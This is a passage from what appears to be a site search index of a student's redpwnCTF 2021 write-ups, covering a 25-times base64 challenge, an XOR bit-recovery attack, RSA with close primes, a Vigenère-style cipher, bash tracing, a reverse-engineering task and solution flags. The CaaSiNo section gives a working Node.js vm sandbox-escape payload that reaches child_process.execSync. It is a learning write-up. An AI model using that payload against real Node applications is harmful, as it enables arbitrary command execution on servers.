base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode","title":"Experienced CTF Player"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/base64/#examine-the-source-code","text":"Here's the source code of the generate.js file: const btoa = str => Buffer . from ( str ). toString ( 'base64' ); const fs = require ( \"fs\" ); const flag = fs . readFileSync ( \"flag.txt\" , \"utf8\" ). trim (); let ret = flag ; for ( let i = 0 ; i < 25 ; i ++ ) ret = btoa ( ret ); fs . writeFileSync ( \"cipher.txt\" , ret ); From the first like, we know that the functino btoa uses base64 encoding to encode the passed in str string. Then this functino is calleng 25 times in the for loop. So what we have to do decode the input cipher 25 times in base 64.","title":"Examine the Source Code"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/base64/#python-script","text":"We can use the python base64 module to handle the diciphering. All we need to do is run base64 decode 25 times and we sholud get the flag. import base64 f = open ( 'cipher.txt' , 'r' ) cipher = f . read () ptxt = cipher for i in range ( 25 ): ptxt = base64 . b64decode ( ptxt ) print ( ptxt ) Output : python3 ape.py b 'flag{l00ks_l1ke_a_l0t_of_64s}'","title":"Python Script"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/itsy-bitsy/","text":"itsy-bitsy \u00b6 For this question, we were given a script and a netcat connection to work with. We want to recover the flag with the encrypted flag printed out by the programme. Examine the Source Code \u00b6 n = len ( flag_bits ) random_bits = generate_random_bits ( lb , ub , n ) encrypted_bits = bit_str_xor ( flag_bits , random_bits ) print ( f 'Ciphertext: { encrypted_bits } ' ) this is the core encryption call to encryption function. We can see that it gets the length of the flag_bits and genrates some random bits based on our i and j input. Then it sends these values to a bitwise XOR encryption. XOR Demonstration rnd = 10100101 flag = 10110111 10110101 XOR 10110111 -------------- 00000010 The Random Generator \u00b6 It would be imposible to solve this question if the programm really genrerates random bits to XOR against the flag. We do have some control over the genreation of the bits and thats where we find our exploit/ i , j = recv_input () lb = 2 ** i ub = 2 ** j - 1 random_bits = generate_random_bits ( lb , ub , n ) def generate_random_bits ( lower_bound , upper_bound , number_of_bits ): bit_str = '' while len ( bit_str ) < number_of_bits : r = randint ( lower_bound , upper_bound ) bit_str += bin ( r )[ 2 :] return bit_str [: number_of_bits ] The program first takes in an input of i and j but j>i>0 . It calculates an upper bound and lower bound by raising 2 to the i and 2 to the j minus one. Then it sends the ub and lb along with the number of bits to the genreation. Here the number_of_bits is just the flag length, which is 301 .(I found it by doing len(n) ). In the generate_random_bits function, we first get an random integer bounded by the ub and lb then it just turs that integer in to binary bits and appends it to the random bits. Finding Patterns \u00b6 The only control over the program is i and j . Theres a number of things we need to notice * We don't want a huge range of i and j since we don't want the randint() to gives us too unpredictable results * We have to follow the rules of j>i>0 . I was initially thinking about setting i and j equal so that we could get huge chunk of all 1 's in the random bits * There are some special things about j since the ub is determined by 2**j -1 not 2**j Based on these observation I started to test the inputs i and j and I saw some patterns. | i | j | bin(2 i)|bin(2 j-1)| |---|---|---|---| | 1 | 2 | 10| 11 | | 2 |3 |100|111| | 3 |4 |1000|1111| Do we see some patterns here? If we list out all the posibilities of binary ub and lb for each group, we can see that they always have the same amount of digits, where the first digit always seem to be 1 . To verify this though, I wrote a test script that will list out all the possibilities for each char(7 bits) in the case of i=1 and j=2 . This is what I got even = [ 0b1111111 , 0b1111110 , 0b1111011 , 0b1111010 , 0b1101111 , 0b1101110 , 0b1101011 , 0b1101010 , 0b0111111 , 0b0111110 , 0b0111011 , 0b0111010 , 0b0101111 , 0b0101110 , 0b0101011 , 0b0101010 ] odd = [ 0b1111111 , 0b1111101 , 0b1110111 , 0b1110101 , 0b1011111 , 0b1011101 , 0b1010111 , 0b1010101 ] and if we lay it out vertically indeed we can see that every 2nd bit is always a 1 no matter what. odd 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 1 1 1 0 1 1 1 0 1 1 0 1 0 1 1 1 1 0 1 0 1 0 1 even 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 1 1 1 0 1 1 1 0 1 1 0 1 0 1 1 1 1 0 1 0 1 0 0 1 1 1 1 1 1 0 1 1 1 1 1 0 0 1 1 1 0 1 1 0 1 1 1 0 1 0 0 1 0 1 1 1 1 0 1 0 1 1 1 0 0 1 0 1 0 1 1 0 1 0 1 0 1 0 This is the case because any integer from the range 2**i to 2**j-1 always start with a one and they are all the same length for example: i = 3 j = 4 2**i = 8 2**j -1 = 15 8 9 10 11 12 13 14 15 1000 1001 1010 1011 1100 1101 1110 1111 So now we know that for each pair of i we have j = i+1 and we get to know each j bits for certain! The Exlpoit \u00b6 For the 301 bits we need to get, we need to run all the way up to i=300 and j=301 and we need to have a way to save the answers of 1^flag[i] to a buffer. I wrote a scrip that will handle everything. from pwn import * context . log_level = 'error' def BinaryToDecimal ( binary ): string = int ( binary , 2 ) return string def Bin2Str ( bin ): str_data = ' ' for i in range ( 0 , len ( bin ), 7 ): temp_data = bin [ i : i + 7 ] decimal_data = BinaryToDecimal ( temp_data ) str_data = str_data + chr ( decimal_data ) return str_data ans = [ '0' ] * 301 host , port = '2020.redpwnc.tf' , 31284 for i in range ( 1 , 300 ): print ( \"Getting Every \" + str ( i + 1 ) + \" Bits\" ) s = remote ( host , port ) s . sendline ( str ( i )) s . sendline ( str ( i + 1 )) res = s . recvline () res = list ( str ( res ) . replace ( \"b'Enter an integer i such that i > 0: Enter an integer j such that j > i > 0: Ciphertext: \" , \"\" ) . replace ( \" \\\\ n'\" , '' )) for j in range ( len ( res )): if ( j % ( i + 1 ) == 0 ): ans [ j ] = str ( int ( res [ j ]) ^ 1 ) print ( Bin2Str ( '' . join ( ans ))) print ( '' . join ( ans ))","title":"itsy-bitsy"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/itsy-bitsy/#itsy-bitsy","text":"For this question, we were given a script and a netcat connection to work with. We want to recover the flag with the encrypted flag printed out by the programme.","title":"itsy-bitsy"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/itsy-bitsy/#examine-the-source-code","text":"n = len ( flag_bits ) random_bits = generate_random_bits ( lb , ub , n ) encrypted_bits = bit_str_xor ( flag_bits , random_bits ) print ( f 'Ciphertext: { encrypted_bits } ' ) this is the core encryption call to encryption function. We can see that it gets the length of the flag_bits and genrates some random bits based on our i and j input. Then it sends these values to a bitwise XOR encryption. XOR Demonstration rnd = 10100101 flag = 10110111 10110101 XOR 10110111 -------------- 00000010","title":"Examine the Source Code"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/itsy-bitsy/#the-random-generator","text":"It would be imposible to solve this question if the programm really genrerates random bits to XOR against the flag. We do have some control over the genreation of the bits and thats where we find our exploit/ i , j = recv_input () lb = 2 ** i ub = 2 ** j - 1 random_bits = generate_random_bits ( lb , ub , n ) def generate_random_bits ( lower_bound , upper_bound , number_of_bits ): bit_str = '' while len ( bit_str ) < number_of_bits : r = randint ( lower_bound , upper_bound ) bit_str += bin ( r )[ 2 :] return bit_str [: number_of_bits ] The program first takes in an input of i and j but j>i>0 . It calculates an upper bound and lower bound by raising 2 to the i and 2 to the j minus one. Then it sends the ub and lb along with the number of bits to the genreation. Here the number_of_bits is just the flag length, which is 301 .(I found it by doing len(n) ). In the generate_random_bits function, we first get an random integer bounded by the ub and lb then it just turs that integer in to binary bits and appends it to the random bits.","title":"The Random Generator"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/itsy-bitsy/#finding-patterns","text":"The only control over the program is i and j . Theres a number of things we need to notice * We don't want a huge range of i and j since we don't want the randint() to gives us too unpredictable results * We have to follow the rules of j>i>0 . I was initially thinking about setting i and j equal so that we could get huge chunk of all 1 's in the random bits * There are some special things about j since the ub is determined by 2**j -1 not 2**j Based on these observation I started to test the inputs i and j and I saw some patterns. | i | j | bin(2 i)|bin(2 j-1)| |---|---|---|---| | 1 | 2 | 10| 11 | | 2 |3 |100|111| | 3 |4 |1000|1111| Do we see some patterns here? If we list out all the posibilities of binary ub and lb for each group, we can see that they always have the same amount of digits, where the first digit always seem to be 1 . To verify this though, I wrote a test script that will list out all the possibilities for each char(7 bits) in the case of i=1 and j=2 . This is what I got even = [ 0b1111111 , 0b1111110 , 0b1111011 , 0b1111010 , 0b1101111 , 0b1101110 , 0b1101011 , 0b1101010 , 0b0111111 , 0b0111110 , 0b0111011 , 0b0111010 , 0b0101111 , 0b0101110 , 0b0101011 , 0b0101010 ] odd = [ 0b1111111 , 0b1111101 , 0b1110111 , 0b1110101 , 0b1011111 , 0b1011101 , 0b1010111 , 0b1010101 ] and if we lay it out vertically indeed we can see that every 2nd bit is always a 1 no matter what. odd 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 1 1 1 0 1 1 1 0 1 1 0 1 0 1 1 1 1 0 1 0 1 0 1 even 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 1 1 1 0 1 1 1 0 1 1 0 1 0 1 1 1 1 0 1 0 1 0 0 1 1 1 1 1 1 0 1 1 1 1 1 0 0 1 1 1 0 1 1 0 1 1 1 0 1 0 0 1 0 1 1 1 1 0 1 0 1 1 1 0 0 1 0 1 0 1 1 0 1 0 1 0 1 0 This is the case because any integer from the range 2**i to 2**j-1 always start with a one and they are all the same length for example: i = 3 j = 4 2**i = 8 2**j -1 = 15 8 9 10 11 12 13 14 15 1000 1001 1010 1011 1100 1101 1110 1111 So now we know that for each pair of i we have j = i+1 and we get to know each j bits for certain!","title":"Finding Patterns"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/itsy-bitsy/#the-exlpoit","text":"For the 301 bits we need to get, we need to run all the way up to i=300 and j=301 and we need to have a way to save the answers of 1^flag[i] to a buffer. I wrote a scrip that will handle everything. from pwn import * context . log_level = 'error' def BinaryToDecimal ( binary ): string = int ( binary , 2 ) return string def Bin2Str ( bin ): str_data = ' ' for i in range ( 0 , len ( bin ), 7 ): temp_data = bin [ i : i + 7 ] decimal_data = BinaryToDecimal ( temp_data ) str_data = str_data + chr ( decimal_data ) return str_data ans = [ '0' ] * 301 host , port = '2020.redpwnc.tf' , 31284 for i in range ( 1 , 300 ): print ( \"Getting Every \" + str ( i + 1 ) + \" Bits\" ) s = remote ( host , port ) s . sendline ( str ( i )) s . sendline ( str ( i + 1 )) res = s . recvline () res = list ( str ( res ) . replace ( \"b'Enter an integer i such that i > 0: Enter an integer j such that j > i > 0: Ciphertext: \" , \"\" ) . replace ( \" \\\\ n'\" , '' )) for j in range ( len ( res )): if ( j % ( i + 1 ) == 0 ): ans [ j ] = str ( int ( res [ j ]) ^ 1 ) print ( Bin2Str ( '' . join ( ans ))) print ( '' . join ( ans ))","title":"The Exlpoit"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/primimity/","text":"primimity \u00b6 This challenges gives us the n and e in a RSA encryption. And it tells us that n consists of 3 1024-bit primes. In this case, we probably can't factor n with Crypto tools and by checking factordb, there is no entry of n . So we need to start from the prime-generation python script. The Script \u00b6 def prime_gen (): i = getRandomNBitInteger ( 1024 ) d = getRandomNBitInteger ( 8 ) for _ in range ( d ): i = find_next_prime ( i ) p = find_next_prime ( i ) d = getRandomNBitInteger ( 8 ) for _ in range ( d ): i = find_next_prime ( i ) q = find_next_prime ( i ) d = getRandomNBitInteger ( 8 ) for _ in range ( d ): i = find_next_prime ( i ) r = find_next_prime ( i ) return ( p , q , r ) this is the prime genration function of the script and we can see how it works. First in generates a random 1024 bit integer to form the base of the random generation. Then for three primes, it generates an 8 bit integer and finds the next_integer after the 1024 base integer that many times. What can se spot here? Like the name suggests, I kind of get of sence of \"proximity\". This is because all three primes are generated base off one 1024 bit random integer, and the only thing thats different between the three primes are how many times next_prime is called. An 8 bit integer can be 0-255 which is not that much. So the biggest gap between each prime is 255 primes away. The Exploit \u00b6 By knowing that these primes are close to each other, we could just write something that goes around the cube root of n and check each prime around the range of +-255 primes. This is tedious work so I wrote a script to handle that. We check each prime by n%found_prime == 0 and it's a factor of n, we found a factor of n . Notice we only need 2 out of 3 primes to find all of them. In my case, I was only able to get 2 primes, but that gives me the third one as well.We know that one is above the cube root and one is below, we could just find the third one by division. curr = # Cube root of n, skiped to save space for x in range ( 300 ): curr = find_prev_prime ( curr ) posible . append ( curr ) curr = # Cube root of n, skiped to save space for x in range ( 300 ): curr = find_next_prime ( curr ) posible . append ( curr ) ans = [] for x in posible : if ( n % x == 0 ): ans . append ( x ) curr = # Cube root of n, skiped to save space for x in range ( curr , n ): if ( new * x == n ): ans . append ( x ) break curr = # Cube root of n, skiped to save space for x in range ( curr , n , - 1 ): if ( new * x == n ): ans . append ( x ) break print ( ans ) I modified the find_next_prime function to find the previous prime so that we get a range of +-256 . Then we just wait for the primes to get calculated. The Flag \u00b6 Finally, we get the three primes we could just do our regular RSA decryption by finding the totient and the moduler inverse of e and phi from Crypto.Util.number import inverse p , q , r = 139926822890670655977195962770726941986198973494425759476822219188316377933161673759394901805855617939978281385708941597117531007973713846772205166659227214187622925135931456526921198848312215276630974951050306344412865900075089120689559331322162952820292429725303619113876104177529039691490258588465409208581 , 139926822890670655977195962770726941986198973494425759476822219188316377933161673759394901805855617939978281385708941597117531007973713846772205166659227214187622925135931456526921198848312215276630974951050306344412865900075089120689559331322162952820292429725303619113876104177529039691490258588465409397803 , 139926822890670655977195962770726941986198973494425759476822219188316377933161673759394901805855617939978281385708941597117531007973713846772205166659227214187622925135931456526921198848312215276630974951050306344412865900075089120689559331322162952820292429725303619113876104177529039691490258588465409494847 n = # Deleted to Save Space e = 65537 c = # Deleted to Save Space phi = ( p - 1 ) * ( q - 1 ) * ( r - 1 ) d = inverse ( e , phi ) m = pow ( c , d , n ) print ( hex ( m ))","title":"primimity"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/primimity/#primimity","text":"This challenges gives us the n and e in a RSA encryption. And it tells us that n consists of 3 1024-bit primes. In this case, we probably can't factor n with Crypto tools and by checking factordb, there is no entry of n . So we need to start from the prime-generation python script.","title":"primimity"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/primimity/#the-script","text":"def prime_gen (): i = getRandomNBitInteger ( 1024 ) d = getRandomNBitInteger ( 8 ) for _ in range ( d ): i = find_next_prime ( i ) p = find_next_prime ( i ) d = getRandomNBitInteger ( 8 ) for _ in range ( d ): i = find_next_prime ( i ) q = find_next_prime ( i ) d = getRandomNBitInteger ( 8 ) for _ in range ( d ): i = find_next_prime ( i ) r = find_next_prime ( i ) return ( p , q , r ) this is the prime genration function of the script and we can see how it works. First in generates a random 1024 bit integer to form the base of the random generation. Then for three primes, it generates an 8 bit integer and finds the next_integer after the 1024 base integer that many times. What can se spot here? Like the name suggests, I kind of get of sence of \"proximity\". This is because all three primes are generated base off one 1024 bit random integer, and the only thing thats different between the three primes are how many times next_prime is called. An 8 bit integer can be 0-255 which is not that much. So the biggest gap between each prime is 255 primes away.","title":"The Script"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/primimity/#the-exploit","text":"By knowing that these primes are close to each other, we could just write something that goes around the cube root of n and check each prime around the range of +-255 primes. This is tedious work so I wrote a script to handle that. We check each prime by n%found_prime == 0 and it's a factor of n, we found a factor of n . Notice we only need 2 out of 3 primes to find all of them. In my case, I was only able to get 2 primes, but that gives me the third one as well.We know that one is above the cube root and one is below, we could just find the third one by division. curr = # Cube root of n, skiped to save space for x in range ( 300 ): curr = find_prev_prime ( curr ) posible . append ( curr ) curr = # Cube root of n, skiped to save space for x in range ( 300 ): curr = find_next_prime ( curr ) posible . append ( curr ) ans = [] for x in posible : if ( n % x == 0 ): ans . append ( x ) curr = # Cube root of n, skiped to save space for x in range ( curr , n ): if ( new * x == n ): ans . append ( x ) break curr = # Cube root of n, skiped to save space for x in range ( curr , n , - 1 ): if ( new * x == n ): ans . append ( x ) break print ( ans ) I modified the find_next_prime function to find the previous prime so that we get a range of +-256 . Then we just wait for the primes to get calculated.","title":"The Exploit"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/primimity/#the-flag","text":"Finally, we get the three primes we could just do our regular RSA decryption by finding the totient and the moduler inverse of e and phi from Crypto.Util.number import inverse p , q , r = 139926822890670655977195962770726941986198973494425759476822219188316377933161673759394901805855617939978281385708941597117531007973713846772205166659227214187622925135931456526921198848312215276630974951050306344412865900075089120689559331322162952820292429725303619113876104177529039691490258588465409208581 , 139926822890670655977195962770726941986198973494425759476822219188316377933161673759394901805855617939978281385708941597117531007973713846772205166659227214187622925135931456526921198848312215276630974951050306344412865900075089120689559331322162952820292429725303619113876104177529039691490258588465409397803 , 139926822890670655977195962770726941986198973494425759476822219188316377933161673759394901805855617939978281385708941597117531007973713846772205166659227214187622925135931456526921198848312215276630974951050306344412865900075089120689559331322162952820292429725303619113876104177529039691490258588465409494847 n = # Deleted to Save Space e = 65537 c = # Deleted to Save Space phi = ( p - 1 ) * ( q - 1 ) * ( r - 1 ) d = inverse ( e , phi ) m = pow ( c , d , n ) print ( hex ( m ))","title":"The Flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/pseudo-key/","text":"pseudo-key \u00b6 This crypto challenge is all about reversing the encryption. The problem provided us with the encryption method, since each char in the ciphertext and plaintext is encrypted independantly, and does not change according to other characters in the string, i like to run all possible readable strings on the cipher text. This way, we could check our output and see if it gives us a readable answer. I'll say this is NOT the best way of solving this challenge, but it saves some time on reversing the encryption. Understanding the Code \u00b6 The million dollar question here is to understand the core code. def encrypt ( ptxt , key ): ptxt = ptxt . lower () key = '' . join ( key [ i % len ( key )] for i in range ( len ( ptxt ))) . lower () ctxt = '' for i in range ( len ( ptxt )): if ptxt [ i ] == '_' : ctxt += '_' continue x = chr_to_num [ ptxt [ i ]] y = chr_to_num [ key [ i ]] ctxt += num_to_chr [( x + y ) % 26 ] return ctxt This is the encrypte function, it takes a plain text and key and returns a cipher text. The key is cycled to match the length of the plain text and then the encryption starts. The two paralle arrays elements at i will get converted into a number then the cipher text is just the sum of them mod 26 back to a char. By using my method of guessing all the posible chars, I don't really need to understand and reverse the algorithem since the programe does the work. Solution \u00b6 from string import ascii_lowercase import itertools from collections import defaultdict chr_to_num = { c : i for i , c in enumerate ( ascii_lowercase )} num_to_chr = { i : c for i , c in enumerate ( ascii_lowercase )} def encrypt ( ptxt , key ): ptxt = ptxt . lower () key = '' . join ( key [ i % len ( key )] for i in range ( len ( ptxt ))) . lower () ctxt = '' for i in range ( len ( ptxt )): if ptxt [ i ] == '_' : ctxt += '_' continue x = chr_to_num [ ptxt [ i ]] y = chr_to_num [ key [ i ]] ctxt += num_to_chr [( x + y ) % 26 ] return ctxt cipher = \"iigesssaemk\" key = \"iigesssaemk\" key = '' . join ( key [ i % len ( key )] for i in range ( len ( cipher ))) . lower () flag = '' posible = [] for curr in range ( 0 , len ( key )): posible . append ([]) for y in ascii_lowercase : x = chr_to_num [ y ] z = chr_to_num [ y ] if ( num_to_chr [( x + z ) % 26 ] == cipher [ curr ]): flag += y if y not in posible [ curr ]: posible [ curr ] . append ( y ) posible = list ( itertools . product ( * posible )) for x in range ( 0 , len ( posible )): posible [ x ] = '' . join ( posible [ x ]) for choice in posible : cipher = \"z_jjaoo_rljlhr_gauf_twv_shaqzb_ljtyut\" key = choice key = '' . join ( key [ i % len ( key )] for i in range ( len ( cipher ))) . lower () flag = '' for curr in range ( 0 , len ( cipher )): if ( cipher [ curr ] == '_' ): flag += '_' for y in ascii_lowercase : x = chr_to_num [ y ] z = chr_to_num [ key [ curr ]] if ( num_to_chr [( x + z ) % 26 ] == cipher [ curr ]): flag += y print ( flag ) First we run key to key, we get all posible keys. Then we run this againts the cipher text. Get the flag \u00b6 To get the flag, we need a bit of searching and guessing. By looking at the output, we can summarize the flag to readable words. Flag \u00b6 flag{i_guess_pseudo_keys_are_pseudo_secure}","title":"pseudo-key"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/pseudo-key/#pseudo-key","text":"This crypto challenge is all about reversing the encryption. The problem provided us with the encryption method, since each char in the ciphertext and plaintext is encrypted independantly, and does not change according to other characters in the string, i like to run all possible readable strings on the cipher text. This way, we could check our output and see if it gives us a readable answer. I'll say this is NOT the best way of solving this challenge, but it saves some time on reversing the encryption.","title":"pseudo-key"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/pseudo-key/#understanding-the-code","text":"The million dollar question here is to understand the core code. def encrypt ( ptxt , key ): ptxt = ptxt . lower () key = '' . join ( key [ i % len ( key )] for i in range ( len ( ptxt ))) . lower () ctxt = '' for i in range ( len ( ptxt )): if ptxt [ i ] == '_' : ctxt += '_' continue x = chr_to_num [ ptxt [ i ]] y = chr_to_num [ key [ i ]] ctxt += num_to_chr [( x + y ) % 26 ] return ctxt This is the encrypte function, it takes a plain text and key and returns a cipher text. The key is cycled to match the length of the plain text and then the encryption starts. The two paralle arrays elements at i will get converted into a number then the cipher text is just the sum of them mod 26 back to a char. By using my method of guessing all the posible chars, I don't really need to understand and reverse the algorithem since the programe does the work.","title":"Understanding the Code"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/pseudo-key/#solution","text":"from string import ascii_lowercase import itertools from collections import defaultdict chr_to_num = { c : i for i , c in enumerate ( ascii_lowercase )} num_to_chr = { i : c for i , c in enumerate ( ascii_lowercase )} def encrypt ( ptxt , key ): ptxt = ptxt . lower () key = '' . join ( key [ i % len ( key )] for i in range ( len ( ptxt ))) . lower () ctxt = '' for i in range ( len ( ptxt )): if ptxt [ i ] == '_' : ctxt += '_' continue x = chr_to_num [ ptxt [ i ]] y = chr_to_num [ key [ i ]] ctxt += num_to_chr [( x + y ) % 26 ] return ctxt cipher = \"iigesssaemk\" key = \"iigesssaemk\" key = '' . join ( key [ i % len ( key )] for i in range ( len ( cipher ))) . lower () flag = '' posible = [] for curr in range ( 0 , len ( key )): posible . append ([]) for y in ascii_lowercase : x = chr_to_num [ y ] z = chr_to_num [ y ] if ( num_to_chr [( x + z ) % 26 ] == cipher [ curr ]): flag += y if y not in posible [ curr ]: posible [ curr ] . append ( y ) posible = list ( itertools . product ( * posible )) for x in range ( 0 , len ( posible )): posible [ x ] = '' . join ( posible [ x ]) for choice in posible : cipher = \"z_jjaoo_rljlhr_gauf_twv_shaqzb_ljtyut\" key = choice key = '' . join ( key [ i % len ( key )] for i in range ( len ( cipher ))) . lower () flag = '' for curr in range ( 0 , len ( cipher )): if ( cipher [ curr ] == '_' ): flag += '_' for y in ascii_lowercase : x = chr_to_num [ y ] z = chr_to_num [ key [ curr ]] if ( num_to_chr [( x + z ) % 26 ] == cipher [ curr ]): flag += y print ( flag ) First we run key to key, we get all posible keys. Then we run this againts the cipher text.","title":"Solution"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/pseudo-key/#get-the-flag","text":"To get the flag, we need a bit of searching and guessing. By looking at the output, we can summarize the flag to readable words.","title":"Get the flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Cryptography/pseudo-key/#flag","text":"flag{i_guess_pseudo_keys_are_pseudo_secure}","title":"Flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Miscellaneous/CaaSiNo/","text":"CaSSiNo \u00b6 By observing the source code, we can see that we can input any javascript code in prompt to run it in VM (nodejs module). The Source Code \u00b6 The main function call in this programm is const result = vm . runInNewContext ( input ) This means that whatever input we give the binary, it will run it in a new context, of course, without any filters. The Solution \u00b6 I'm not too familiar with nodejs nor node vm modules so I searched up node vm security and I found an article on Pwnisher Blog called Sandboxing NodeJS is hard, here is why . It basically is set up almost identical to this challenge. By modifing the payload a bit I got: const process = this . constructor . constructor ( 'return this.process' )(); process . mainModule . require ( 'child_process' ). execSync ( 'cat /ctf/flag.txt' ). toString () Since we know the flag location from the hint, we can just put that in. ==> flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}","title":"CaSSiNo"},{"location":"CTF%20Writeups/redpwnCTF%202021/Miscellaneous/CaaSiNo/#cassino","text":"By observing the source code, we can see that we can input any javascript code in prompt to run it in VM (nodejs module).","title":"CaSSiNo"},{"location":"CTF%20Writeups/redpwnCTF%202021/Miscellaneous/CaaSiNo/#the-source-code","text":"The main function call in this programm is const result = vm . runInNewContext ( input ) This means that whatever input we give the binary, it will run it in a new context, of course, without any filters.","title":"The Source Code"},{"location":"CTF%20Writeups/redpwnCTF%202021/Miscellaneous/CaaSiNo/#the-solution","text":"I'm not too familiar with nodejs nor node vm modules so I searched up node vm security and I found an article on Pwnisher Blog called Sandboxing NodeJS is hard, here is why . It basically is set up almost identical to this challenge. By modifing the payload a bit I got: const process = this . constructor . constructor ( 'return this.process' )(); process . mainModule . require ( 'child_process' ). execSync ( 'cat /ctf/flag.txt' ). toString () Since we know the flag location from the hint, we can just put that in. ==> flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}","title":"The Solution"},{"location":"CTF%20Writeups/redpwnCTF%202021/Miscellaneous/uglybash/","text":"uglybash \u00b6 This challenge gives us a bash that is encoded in a wired way. No human readable stuff. I couldn't run the script at first because I was using zsh . By asking the author, I was able to run the script using bash itself. Script \u00b6 The script is simple, it echo's out a line that has the flag, but it is not displaying since it's in the comments. What we need to do here is try to show the verbose version of bash running, like running gdb but for bash. Solution \u00b6 Im not to familiar with bash so I looked up bash debug and I found that we could use the flag -x to enter the mode. The program spits out quite some junk but I found these lines pretty interesting ... +++ printf %s h +++ printf %s o ... These are probably the flag contest as the format string function is taking in a %s string and the input should be the letter after it. I didn't want to write a script so I just coppied the input and did a regex replace and got the lines together to form the flag. First REGEX Replace: ^((?!printf %s .).)*$ to empty Second REGEX Replace: \\+\\+\\+ printf %s to empty Third REGEX Replace: \\n to empty Flag \u00b6 OUTPUT: echo' 'dont' 'just' 'run' 'it,' 'dummy' ''#'' 'flag'{'us3_zsh,_dummy'}''","title":"uglybash"},{"location":"CTF%20Writeups/redpwnCTF%202021/Miscellaneous/uglybash/#uglybash","text":"This challenge gives us a bash that is encoded in a wired way. No human readable stuff. I couldn't run the script at first because I was using zsh . By asking the author, I was able to run the script using bash itself.","title":"uglybash"},{"location":"CTF%20Writeups/redpwnCTF%202021/Miscellaneous/uglybash/#script","text":"The script is simple, it echo's out a line that has the flag, but it is not displaying since it's in the comments. What we need to do here is try to show the verbose version of bash running, like running gdb but for bash.","title":"Script"},{"location":"CTF%20Writeups/redpwnCTF%202021/Miscellaneous/uglybash/#solution","text":"Im not to familiar with bash so I looked up bash debug and I found that we could use the flag -x to enter the mode. The program spits out quite some junk but I found these lines pretty interesting ... +++ printf %s h +++ printf %s o ... These are probably the flag contest as the format string function is taking in a %s string and the input should be the letter after it. I didn't want to write a script so I just coppied the input and did a regex replace and got the lines together to form the flag. First REGEX Replace: ^((?!printf %s .).)*$ to empty Second REGEX Replace: \\+\\+\\+ printf %s to empty Third REGEX Replace: \\n to empty","title":"Solution"},{"location":"CTF%20Writeups/redpwnCTF%202021/Miscellaneous/uglybash/#flag","text":"OUTPUT: echo' 'dont' 'just' 'run' 'it,' 'dummy' ''#'' 'flag'{'us3_zsh,_dummy'}''","title":"Flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Reverse%20Engineering/bubbly/","text":"bubbly \u00b6 By running file on the binary, we see something very interesting. bubbly: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=edb56d2d9355bcee01909f171d8a272a3e82d053, with debug_info, not stripped This binary is not strippe and also contains debug_info which makes it pretty easy to reverse. Decompiler \u00b6 By putting the binary in ghydra and analyzing the code, we get a sence of what the functinos do. There are 2 main functions we care about main and check . I converted the functions and arguments into python code and here's the logic behind the binary p = False import operator def check (): i = 0 while ( True ): if ( 8 < i ): return True if ( nums [ i + 1 ] < nums [ i ]): break i += 1 return False while ( True ): n = int ( input ()) if ( n > 8 ): break nums [ n ] = operator . xor ( nums [ n ], nums [ n + 1 ]) nums [ n + 1 ] = operator . xor ( nums [ n + 1 ], nums [ n ]) nums [ n ] = operator . xor ( nums [ n ], nums [ n + 1 ]) print ( nums ) p = check () if ( p ): print ( \"got it\" ) else : print ( \"nope\" ) These are some lines that we do care about. This is the condition where check() doesn't break and when i increments over 8 returns true. if ( nums [ i + 1 ] < nums [ i ]): By doing some experiments, we know that this is just changin the order of nums[n] and nums[n+1] by running XOR 3 times. nums [ n ] = operator . xor ( nums [ n ], nums [ n + 1 ]) nums [ n + 1 ] = operator . xor ( nums [ n + 1 ], nums [ n ]) nums [ n ] = operator . xor ( nums [ n ], nums [ n + 1 ]) So if we want check to return true, we need to make every element in nums greater than the previous element in nums . Basically in incremental order. nums \u00b6 We need to set nums, but what is nums? Well it's just a variable stored in memory, since we have full access to the memory of the binary, we could use gdb and find out the values of nums > x/24wx nums 0x4060 <nums>: 0x00000001 0x0000000a 0x00000003 0x00000002 0x4070 <nums+16>:0x00000005 0x00000009 0x00000008 0x00000007 0x4080 <nums+32>:0x00000004 0x00000006 Cannot access memory at address 0x4088 So we can see that there are 10 elements in nums and we could convert the hex to decimal by hand since they are pretty small. Here's what I got. nums = [ 1 , 10 , 3 , 2 , 5 , 9 , 8 , 7 , 4 , 6 ] What we need to do now is find a series of indexes and swap the element at i and i+1 and ultimately sort the array. The Exploit \u00b6 By keeping track of the array on a piece of paper, I was able to find the set of moves to sort nums and 